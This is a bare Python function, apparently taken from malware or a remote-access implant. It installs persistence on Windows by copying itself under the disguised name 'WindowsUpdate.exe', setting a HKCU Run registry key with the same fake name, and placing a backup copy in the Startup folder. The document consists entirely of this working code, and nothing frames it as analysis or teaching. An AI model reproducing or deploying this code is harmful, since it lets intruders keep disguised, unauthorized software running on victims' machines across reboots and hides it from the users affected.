def install_persistence():
    """Copy self to AppData and set Registry Run key + Startup folder (idempotent)."""
    try:
        dest_dir = Path(agents_dir)
        dest_path = dest_dir / 'WindowsUpdate.exe'
        current = Path(sys.executable if getattr(sys, 'frozen', False) else __file__)

        # Skip copy if destination already exists (persistence already installed)
        if not dest_path.exists():
            shutil.copy2(current, dest_path)

        # Registry Run key (HKCU) – create or update
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER,
                             r'Software\Microsoft\Windows\CurrentVersion\Run',
                             0, winreg.KEY_SET_VALUE)
        winreg.SetValueEx(key, 'WindowsUpdate', 0, winreg.REG_SZ, str(dest_path))
        winreg.CloseKey(key)

        # Startup folder backup – skip if already present
        startup = Path(appdata) / r'Microsoft\Windows\Start Menu\Programs\Startup'
        startup.mkdir(parents=True, exist_ok=True)
        startup_copy = startup / 'WindowsUpdate.exe'
        if not startup_copy.exists():
            shutil.copy2(current, startup_copy)
        return True
    except Exception as e:
        log(f"Persistence error: {traceback.format_exc()}")
        return False
